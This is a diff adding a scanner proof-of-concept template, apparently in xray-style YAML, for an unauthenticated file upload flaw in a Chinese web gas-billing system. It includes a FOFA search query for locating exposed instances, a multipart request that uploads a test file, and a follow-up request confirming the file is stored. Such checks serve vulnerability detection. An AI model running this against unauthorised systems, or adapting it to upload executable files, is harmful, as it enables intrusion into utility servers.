@@ -1,0 +1,41 @@
+id: poc-yaml-pioneer-gas-charging-system-upload-aspx-file-upload
+info:
+  name: 先锋WEB燃气收费系统 Upload.aspx 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 先锋WEB燃气收费系统
+  fofa: app="先锋WEB燃气收费系统"
+variables:
+  t1: md5(random_int(1000,10000))
+requests:
+- method: POST
+  path: /AjaxService/Upload.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------361231835115122267584155400789
+  data: '-----------------------------361231835115122267584155400789
+
+    Content-Disposition: form-data; name="Fdata"; filename="test.txt"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t1}}
+
+
+    -----------------------------361231835115122267584155400789
+
+    Content-Disposition: form-data; name="submit"
+
+
+    Submin
+
+    -----------------------------361231835115122267584155400789--'
+  expression: status_code == 200 && contains(body,"UploadFile")
+  output:
+  - regex_match(body,"(?P<t2>[0-9]{6})")
+  - regex_match(body,"(?P<t3>[0-9]{16})")
+- method: GET
+  path: /UploadFile/{{.t2}}/{{.t3}}.txt
+  expression: status_code == 200 && contains(body,t1) && !contains(body,"<")
+transport: http
